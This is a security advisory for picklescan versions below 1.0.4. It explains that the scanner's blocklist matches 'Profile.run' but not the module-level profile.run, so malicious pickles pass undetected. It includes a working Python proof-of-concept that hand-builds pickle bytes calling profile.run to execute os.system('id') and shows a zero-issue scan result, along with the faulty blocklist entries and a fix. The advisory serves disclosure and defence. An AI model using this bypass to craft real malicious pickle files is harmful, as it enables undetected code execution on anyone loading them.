# PickleScan's profile.run blocklist mismatch allows exec() bypass

**GHSA**: GHSA-7wx9-6375-f5wh | **CVE**: N/A | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-184, CWE-697

**Affected Packages**:
- **picklescan** (pip): < 1.0.4

## Description

## Summary

picklescan v1.0.3 blocks `profile.Profile.run` and `profile.Profile.runctx` but does NOT block the module-level `profile.run()` function. A malicious pickle calling `profile.run(statement)` achieves arbitrary code execution via `exec()` while picklescan reports 0 issues. This is because the blocklist entry `"Profile.run"` does not match the pickle global name `"run"`.

## Severity

**High** — Direct code execution via `exec()` with zero scanner detection.

## Affected Versions

- picklescan v1.0.3 (latest — the profile entries were added in recent versions)
- Earlier versions also affected (profile not blocked at all)

## Details

### Root Cause

In `scanner.py` line 199, the blocklist entry for `profile` is:

```python
"profile": {"Profile.run", "Profile.runctx"},
```

When a pickle file imports `profile.run` (the module-level function), picklescan's opcode parser extracts:
- `module = "profile"`
- `name = "run"`

The blocklist check at line 414 is:

```python
elif unsafe_filter is not None and (unsafe_filter == "*" or g.name in unsafe_filter):
```

This checks: is `"run"` in `{"Profile.run", "Profile.runctx"}`?

**Answer: NO.** `"run" != "Profile.run"`. The string comparison is exact — there is no prefix/suffix matching.

### What `profile.run()` Does

```python
# From Python's Lib/profile.py
def run(statement, filename=None, sort=-1):
    prof = Profile()
    try:
        prof.run(statement)  # Calls exec(statement)
    except SystemExit:
        pass
    ...
```

`profile.run(statement)` calls `exec(statement)` internally, enabling arbitrary Python code execution.

### Proof of Concept

```python
import struct, io, pickle

def sbu(s):
    b = s.encode()
    return b"\x8c" + struct.pack("<B", len(b)) + b

# profile.run("import os; os.system('id')")
payload = (
    b"\x80\x04\x95" + struct.pack("<Q", 60)
    + sbu("profile") + sbu("run") + b"\x93"
    + sbu("import os; os.system('id')")
    + b"\x85" + b"R" + b"."
)

# picklescan: 0 issues (name "run" not in {"Profile.run", "Profile.runctx"})
from picklescan.scanner import scan_pickle_bytes
result = scan_pickle_bytes(io.BytesIO(payload), "test.pkl")
assert result.issues_count == 0  # CLEAN!

# Execute: runs exec("import os; os.system('id')") → RCE
pickle.loads(payload)
```

### Comparison

| Pickle Global | Blocklist Entry | Match? | Result |
|--------------|-----------------|--------|--------|
| `("profile", "run")` | `"Profile.run"` | NO — `"run" != "Profile.run"` | CLEAN (bypass!) |
| `("profile", "Profile.run")` | `"Profile.run"` | YES | DETECTED |
| `("profile", "runctx")` | `"Profile.runctx"` | NO — `"runctx" != "Profile.runctx"` | CLEAN (bypass!) |

The pickle opcode `GLOBAL` / `STACK_GLOBAL` resolves `profile.run` to the MODULE-LEVEL function, not the class method `Profile.run`. These are different Python objects but both execute arbitrary code.

## Impact

`profile.run()` provides direct `exec()` execution. An attacker can execute arbitrary Python code while picklescan reports no issues. This is particularly impactful because `exec()` can import any module and call any function, bypassing the blocklist entirely.

## Suggested Fix

Change the `profile` blocklist entry from:
```python
"profile": {"Profile.run", "Profile.runctx"},
```
to:
```python
"profile": "*",
```

Or explicitly add the module-level functions:
```python
"profile": {"Profile.run", "Profile.runctx", "run", "runctx"},
```

## Resources

- picklescan source: `scanner.py` line 199 (`"profile": {"Profile.run", "Profile.runctx"}`)
- picklescan source: `scanner.py` line 414 (exact string match logic)
- Python source: `Lib/profile.py` `run()` function — calls `exec()`
